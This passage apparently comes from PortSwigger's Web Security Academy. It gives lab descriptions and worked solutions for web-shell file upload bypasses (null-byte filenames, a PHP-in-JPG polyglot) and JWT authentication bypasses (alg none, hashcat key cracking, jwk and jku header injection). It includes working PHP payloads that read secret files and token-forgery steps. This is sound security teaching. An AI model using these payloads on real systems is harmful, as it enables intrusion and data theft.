                                    and send the request. Observe that Carlos's secret was returned in the response.
                                    Thanks to our malicious
                                    <code>
        .htaccess
       </code>
                                    file, the
                                    <code>
        .l33t
       </code>
                                    file was executed as if it were a
                                    <code>
        .php
       </code>
                                    file.
                                </li>
                                <li>
                                    Submit the secret to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Web shell upload via obfuscated file extension
                (file-upload)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this
                defense can be bypassed using a classic obfuscation technique.
            </p>
            <p>
                To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file
                <code>
   /home/carlos/secret
  </code>
                . Submit this secret using the button provided in the lab banner.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/4ed109e9f6a1c61c6f344591bd7db083cd04f596804f6ba9670cbd6a3fdcafeb?referrer=%2fweb-security%2ffile-upload%2flab-file-upload-web-shell-upload-via-obfuscated-file-extension"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in and upload an image as your avatar, then go back to your account page.
                                </li>
                                <li>
                                    In Burp, go to
                                    <strong>
                                        Proxy &gt; HTTP history
                                    </strong>
                                    and notice that your image was fetched using a
                                    <code>
        GET
       </code>
                                    request to
                                    <code>
        /files/avatars/&lt;YOUR-IMAGE&gt;
       </code>
                                    . Send this request to Burp Repeater.
                                </li>
                                <li>
                                    <p>
                                        On your system, create a file called
                                        <code>
         exploit.php
        </code>
                                        , containing a script for fetching the contents of Carlos's secret. For example:
                                    </p>
                                    <code class="code-scrollable">
        &lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;
       </code>
                                </li>
                                <li>
                                    Attempt to upload this script as your avatar. The response indicates that you are
                                    only allowed to upload JPG and PNG files.
                                </li>
                                <li>
                                    In Burp's proxy history, find the
                                    <code>
        POST /my-account/avatar
       </code>
                                    request that was used to submit the file upload. Send this to Burp Repeater.
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, go to the tab for the
                                        <code>
         POST /my-account/avatar
        </code>
                                        request and find the part of the body that relates to your PHP file. In the
                                        <code>
         Content-Disposition
        </code>
                                        header, change the value of the
                                        <code>
         filename
        </code>
                                        parameter to include a URL encoded null byte, followed by the
                                        <code>
         .jpg
        </code>
                                        extension:
                                    </p>
                                    <code class="code-scrollable">
        filename="exploit.php%00.jpg"
       </code>
                                </li>
                                <li>
                                    Send the request and observe that the file was successfully uploaded. Notice that
                                    the message refers to the file as
                                    <code>
        exploit.php
       </code>
                                    , suggesting that the null byte and
                                    <code>
        .jpg
       </code>
                                    extension have been stripped.
                                </li>
                                <li>
                                    Switch to the other Repeater tab containing the
                                    <code>
        GET /files/avatars/&lt;YOUR-IMAGE&gt;
       </code>
                                    request. In the path, replace the name of your image file with
                                    <code>
        exploit.php
       </code>
                                    and send the request. Observe that Carlos's secret was returned in the response.
                                </li>
                                <li>
                                    Submit the secret to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Remote code execution via polyglot web shell upload
                (file-upload)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a vulnerable image upload function. Although it checks the contents of the file to
                verify that it is a genuine image, it is still possible to upload and execute server-side code.
            </p>
            <p>
                To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file
                <code>
   /home/carlos/secret
  </code>
                . Submit this secret using the button provided in the lab banner.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/328d640f4802f5285275092d76357ca4aa12c2b12fdd0fbfb606d7952c7114ec?referrer=%2fweb-security%2ffile-upload%2flab-file-upload-remote-code-execution-via-polyglot-web-shell-upload"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        On your system, create a file called
                                        <code>
         exploit.php
        </code>
                                        containing a script for fetching the contents of Carlos's secret. For example:
                                    </p>
                                    <code class="code-scrollable">
        &lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;
       </code>
                                </li>
                                <li>
                                    Log in and attempt to upload the script as your avatar. Observe that the server
                                    successfully blocks you from uploading files that aren't images, even if you try
                                    using some of the techniques you've learned in previous labs.
                                </li>
                                <li>
                                    <p>
                                        Create a polyglot PHP/JPG file that is fundamentally a normal image, but
                                        contains your PHP payload in its metadata. A simple way of doing this is to
                                        download and run ExifTool from the command line as follows:
                                    </p>
                                    <code class="code-scrollable">
        exiftool -Comment="&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;" &lt;YOUR-INPUT-IMAGE&gt;.jpg -o polyglot.php
       </code>
                                    <p>
                                        This adds your PHP payload to the image's
                                        <code>
         Comment
        </code>
                                        field, then saves the image with a
                                        <code>
         .php
        </code>
                                        extension.
                                    </p>
                                </li>
                                <li>
                                    In the browser, upload the polyglot image as your avatar, then go back to your
                                    account page.
                                </li>
                                <li>
                                    <p>
                                        In Burp's proxy history, find the
                                        <code>
         GET /files/avatars/polyglot.php
        </code>
                                        request. Use the message editor's search feature to find the
                                        <code>
         START
        </code>
                                        string somewhere within the binary image data in the response. Between this and
                                        the
                                        <code>
         END
        </code>
                                        string, you should see Carlos's secret, for example:
                                    </p>
                                    <code class="code-scrollable">
        START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END
       </code>
                                </li>
                                <li>
                                    Submit the secret to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: JWT authentication bypass via unverified signature
                (jwt)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server
                doesn't verify the signature of any JWTs that it receives.
            </p>
            <p>
                To solve the lab, modify your session token to gain access to the admin panel at
                <code>
   /admin
  </code>
                , then delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Tip
                </h4>
                <p>
                    We recommend familiarizing yourself with
                    <a
                        href="https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts">
                        how to work with JWTs in Burp Suite
                    </a>
                    before attempting this lab.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/1c5ba013f13bf76fde8d175cfc49bae5eb18e6139eb78e186686cbff1e6c7d02?referrer=%2fweb-security%2fjwt%2flab-jwt-authentication-bypass-via-unverified-signature"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        In the lab, log in to your own account.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to the
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        tab and look at the post-login
                                        <code>
         GET /my-account
        </code>
                                        request. Observe that your session cookie is a JWT.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Double-click the payload part of the token to view its decoded JSON form in the
                                        Inspector panel. Notice that the
                                        <code>
         sub
        </code>
                                        claim contains your username. Send this request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, change the path to
                                        <code>
         /admin
        </code>
                                        and send the request. Observe that the admin panel is only accessible when
                                        logged in as the
                                        <code>
         administrator
        </code>
                                        user.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Select the payload of the JWT again. In the Inspector panel, change the value of
                                        the
                                        <code>
         sub
        </code>
                                        claim from
                                        <code>
         wiener
        </code>
                                        to
                                        <code>
         administrator
        </code>
                                        , then click
                                        <strong>
                                            Apply changes
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request again. Observe that you have successfully accessed the admin
                                        panel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the response, find the URL for deleting
                                        <code>
         carlos
        </code>
                                        (
                                        <code>
         /admin/delete?username=carlos
        </code>
                                        ). Send the request to this endpoint to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: JWT authentication bypass via flawed signature verification
                (jwt)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept
                unsigned JWTs.
            </p>
            <p>
                To solve the lab, modify your session token to gain access to the admin panel at
                <code>
   /admin
  </code>
                , then delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Tip
                </h4>
                <p>
                    We recommend familiarizing yourself with
                    <a
                        href="https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts">
                        how to work with JWTs in Burp Suite
                    </a>
                    before attempting this lab.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/3390f79a2611b22e4fa8d437bd36fb902ea986c0fff45577c1543e0c634f3543?referrer=%2fweb-security%2fjwt%2flab-jwt-authentication-bypass-via-flawed-signature-verification"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        In the lab, log in to your own account.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to the
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        tab and look at the post-login
                                        <code>
         GET /my-account
        </code>
                                        request. Observe that your session cookie is a JWT.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Double-click the payload part of the token to view its decoded JSON form in the
                                        <strong>
                                            Inspector
                                        </strong>
                                        panel. Notice that the
                                        <code>
         sub
        </code>
                                        claim contains your username. Send this request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, change the path to
                                        <code>
         /admin
        </code>
                                        and send the request. Observe that the admin panel is only accessible when
                                        logged in as the
                                        <code>
         administrator
        </code>
                                        user.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Select the payload of the JWT again. In the
                                        <strong>
                                            Inspector
                                        </strong>
                                        panel, change the value of the
                                        <code>
         sub
        </code>
                                        claim to
                                        <code>
         administrator
        </code>
                                        , then click
                                        <strong>
                                            Apply changes
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Select the header of the JWT, then use the Inspector to change the value of the
                                        <code>
         alg
        </code>
                                        parameter to
                                        <code>
         none
        </code>
                                        . Click
                                        <strong>
                                            Apply changes
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the message editor, remove the signature from the JWT, but remember to leave
                                        the trailing dot after the payload.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request and observe that you have successfully accessed the admin
                                        panel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the response, find the URL for deleting
                                        <code>
         carlos
        </code>
                                        (
                                        <code>
         /admin/delete?username=carlos
        </code>
                                        ). Send the request to this endpoint to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: JWT authentication bypass via weak signing key
                (jwt)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both
                sign and verify tokens. This can be easily brute-forced using a
                <a href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">
                    wordlist of common secrets
                </a>
                .
            </p>
            <p>
                To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign
                a modified session token that gives you access to the admin panel at
                <code>
   /admin
  </code>
                , then delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Tip
                </h4>
                <p>
                    We recommend familiarizing yourself with
                    <a
                        href="https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts">
                        how to work with JWTs in Burp Suite
                    </a>
                    before attempting this lab.
                </p>
                <p>
                    We also recommend using hashcat to brute-force the secret key. For details on how to do this, see
                    <a href="https://portswigger.net/web-security/jwt#brute-forcing-secret-keys-using-hashcat">
                        Brute forcing secret keys using hashcat
                    </a>
                    .
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/e9c7b6167992b3c62991a0f0b30c4b0f6e050a62099eea7092823b12da8356b0?referrer=%2fweb-security%2fjwt%2flab-jwt-authentication-bypass-via-weak-signing-key"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <h5>
                                Part 1 - Brute-force the secret key
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In Burp, load the JWT Editor extension from the BApp store.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the lab, log in to your own account and send the post-login
                                        <code>
         GET /my-account
        </code>
                                        request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, change the path to
                                        <code>
         /admin
        </code>
                                        and send the request. Observe that the admin panel is only accessible when
                                        logged in as the
                                        <code>
         administrator
        </code>
                                        user.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Copy the JWT and brute-force the secret. You can do this using hashcat as
                                        follows:
                                    </p>
                                    <code>
        hashcat -a 0 -m 16500 &lt;YOUR-JWT&gt; /path/to/jwt.secrets.list
       </code>
                                    <p>
                                        If you're using hashcat, this outputs the JWT, followed by the secret. If
                                        everything worked correctly, this should reveal that the weak secret is
                                        <code>
         secret1
        </code>
                                        .
                                    </p>
                                </li>
                            </ol>
                            <div class="highlightedarea">
                                <h4>
                                    Note
                                </h4>
                                <p>
                                    Note that if you run the command more than once, you need to include the
                                    <code>
        --show
       </code>
                                    flag to output the results to the console again.
                                </p>
                            </div>
                            <h5>
                                Part 2 - Generate a forged signing key
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Using Burp Decoder, Base64 encode the secret that you brute-forced in the
                                        previous section.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to the
                                        <strong>
                                            JWT Editor Keys
                                        </strong>
                                        tab and click
                                        <strong>
                                            New Symmetric Key
                                        </strong>
                                        . In the dialog, click
                                        <strong>
                                            Generate
                                        </strong>
                                        to generate a new key in JWK format. Note that you don't need to select a key
                                        size as this will automatically be updated later.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Replace the generated value for the
                                        <code>
         k
        </code>
                                        property with the Base64-encoded secret.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            OK
                                        </strong>
                                        to save the key.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Part 3 - Modify and sign the JWT
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Go back to the
                                        <code>
         GET /admin
        </code>
                                        request in Burp Repeater and switch to the extension-generated
                                        <strong>
                                            JSON Web Token
                                        </strong>
                                        message editor tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the payload, change the value of the
                                        <code>
         sub
        </code>
                                        claim to
                                        <code>
         administrator
        </code>
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        At the bottom of the tab, click
                                        <code>
         Sign
        </code>
                                        , then select the key that you generated in the previous section.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Make sure that the
                                        <code>
         Don't modify header
        </code>
                                        option is selected, then click
                                        <code>
         OK
        </code>
                                        . The modified token is now signed with the correct signature.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request and observe that you have successfully accessed the admin
                                        panel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the response, find the URL for deleting
                                        <code>
         carlos
        </code>
                                        (
                                        <code>
         /admin/delete?username=carlos
        </code>
                                        ). Send the request to this endpoint to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: JWT authentication bypass via jwk header injection
                (jwt)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab uses a JWT-based mechanism for handling sessions. The server supports the
                <code>
   jwk
  </code>
                parameter in the JWT header. This is sometimes used to embed the correct verification key directly in
                the token. However, it fails to check whether the provided key came from a trusted source.
            </p>
            <p>
                To solve the lab, modify and sign a JWT that gives you access to the admin panel at
                <code>
   /admin
  </code>
                , then delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Tip
                </h4>
                <p>
                    We recommend familiarizing yourself with
                    <a
                        href="https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts">
                        how to work with JWTs in Burp Suite
                    </a>
                    before attempting this lab.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/a0101cde2e9ba5d478cf9734acc8c05e0dd944dd7ecbdec01a99e17a008f7b42?referrer=%2fweb-security%2fjwt%2flab-jwt-authentication-bypass-via-jwk-header-injection"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        In Burp, load the JWT Editor extension from the BApp store.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the lab, log in to your own account and send the post-login
                                        <code>
         GET /my-account
        </code>
                                        request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, change the path to
                                        <code>
         /admin
        </code>
                                        and send the request. Observe that the admin panel is only accessible when
                                        logged in as the
                                        <code>
         administrator
        </code>
                                        user.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to the
                                        <strong>
                                            JWT Editor Keys
                                        </strong>
                                        tab in Burp's main tab bar.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            New RSA Key
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the dialog, click
                                        <strong>
                                            Generate
                                        </strong>
                                        to automatically generate a new key pair, then click
                                        <strong>
                                            OK
                                        </strong>
                                        to save the key. Note that you don't need to select a key size as this will
                                        automatically be updated later.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go back to the
                                        <code>
         GET /admin
        </code>
                                        request in Burp Repeater and switch to the extension-generated
                                        <code>
         JSON Web Token
        </code>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the payload, change the value of the
                                        <code>
         sub
        </code>
                                        claim to
                                        <code>
         administrator
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        At the bottom of the
                                        <strong>
                                            JSON Web Token
                                        </strong>
                                        tab, click
                                        <strong>
                                            Attack
                                        </strong>
                                        , then select
                                        <strong>
                                            Embedded JWK
                                        </strong>
                                        . When prompted, select your newly generated RSA key and click
                                        <strong>
                                            OK
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the header of the JWT, observe that a
                                        <code>
         jwk
        </code>
                                        parameter has been added containing your public key.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request. Observe that you have successfully accessed the admin panel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the response, find the URL for deleting
                                        <code>
         carlos
        </code>
                                        (
                                        <code>
         /admin/delete?username=carlos
        </code>
                                        ). Send the request to this endpoint to solve the lab.
                                    </p>
                                </li>
                            </ol>
                            <div class="highlightedarea">
                                <h4>
                                    Note
                                </h4>
                                <p>
                                    Instead of using the built-in attack in the JWT Editor extension, you can embed a
                                    JWK by adding a
                                    <code>
        jwk
       </code>
                                    parameter to the header of the JWT manually. In this case, you need to also update
                                    the
                                    <code>
        kid
       </code>
                                    header of the token to match the
                                    <code>
        kid
       </code>
                                    of the embedded key.
                                </p>
                            </div>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: JWT authentication bypass via jku header injection
                (jwt)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab uses a JWT-based mechanism for handling sessions. The server supports the
                <code>
   jku
  </code>
                parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted
                domain before fetching the key.
            </p>
            <p>
                To solve the lab, forge a JWT that gives you access to the admin panel at
                <code>
   /admin
  </code>
                , then delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Tip
                </h4>
                <p>
                    We recommend familiarizing yourself with
                    <a
                        href="https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts">
                        how to work with JWTs in Burp Suite
                    </a>
                    before attempting this lab.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/01b6dad83328cfccc93032501b8d61bfc6683c5f5708bb2461495627003d1381?referrer=%2fweb-security%2fjwt%2flab-jwt-authentication-bypass-via-jku-header-injection"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <h5>
                                Part 1 - Upload a malicious JWK Set
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In Burp, load the JWT Editor extension from the BApp store.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the lab, log in to your own account and send the post-login
                                        <code>
         GET /my-account
        </code>
                                        request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, change the path to
                                        <code>
         /admin
        </code>
                                        and send the request. Observe that the admin panel is only accessible when
                                        logged in as the
                                        <code>
         administrator
        </code>
                                        user.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to the
                                        <strong>
                                            JWT Editor Keys
                                        </strong>
                                        tab in Burp's main tab bar.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            New RSA Key
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the dialog, click
                                        <strong>
                                            Generate
                                        </strong>
                                        to automatically generate a new key pair, then click
                                        <strong>
                                            OK
                                        </strong>
                                        to save the key. Note that you don't need to select a key size as this will
                                        automatically be updated later.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the browser, go to the exploit server.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Replace the contents of the
                                        <strong>
                                            Body
                                        </strong>
                                        section with an empty JWK Set as follows:
                                    </p>
                                    <code class="code-scrollable">
        {
    "keys": [

    ]
}
       </code>
                                </li>
                                <li>
                                    <p>
                                        Back on the
                                        <strong>
                                            JWT Editor Keys
                                        </strong>
                                        tab, right-click on the entry for the key that you just generated, then select
                                        <strong>
                                            Copy Public Key as JWK
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Paste the JWK into the
                                        <code>
         keys
        </code>
                                        array on the exploit server, then store the exploit. The result should look
                                        something like this:
                                    </p>
                                    <code class="code-scrollable">
        {
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7",
            "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
        }
    ]
}
       </code>
                                </li>
                            </ol>
                            <h5>
                                Part 2 - Modify and sign the JWT
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Go back to the
                                        <code>
         GET /admin
        </code>
                                        request in Burp Repeater and switch to the extension-generated
                                        <strong>
                                            JSON Web Token
                                        </strong>
                                        message editor tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the header of the JWT, replace the current value of the
                                        <code>
         kid
        </code>
                                        parameter with the
                                        <code>
         kid
        </code>
                                        of the JWK that you uploaded to the exploit server.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Add a new
                                        <code>
         jku
        </code>
                                        parameter to the header of the JWT. Set its value to the URL of your JWK Set on
                                        the exploit server.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the payload, change the value of the
                                        <code>
         sub
        </code>
                                        claim to
                                        <code>
         administrator
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        At the bottom of the tab, click
                                        <strong>
                                            Sign
                                        </strong>
                                        , then select the RSA key that you generated in the previous section.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Make sure that the
                                        <strong>
                                            Don't modify header
                                        </strong>
                                        option is selected, then click
                                        <strong>
                                            OK
                                        </strong>
                                        . The modified token is now signed with the correct signature.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request. Observe that you have successfully accessed the admin panel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the response, find the URL for deleting
                                        <code>
         carlos
        </code>
                                        (
                                        <code>
         /admin/delete?username=carlos
        </code>
                                        ). Send the request to this endpoint to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: JWT authentication bypass via kid header path traversal
                (jwt)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server
                uses the
                <code>
   kid
  </code>
                parameter in JWT header to fetch the relevant key from its filesystem.
            </p>
            <p>
                To solve the lab, forge a JWT that gives you access to the admin panel at
                <code>
   /admin
  </code>
                , then delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Tip
                </h4>
                <p>
                    We recommend familiarizing yourself with
                    <a
                        href="https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts">
                        how to work with JWTs in Burp Suite
                    </a>
                    before attempting this lab.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
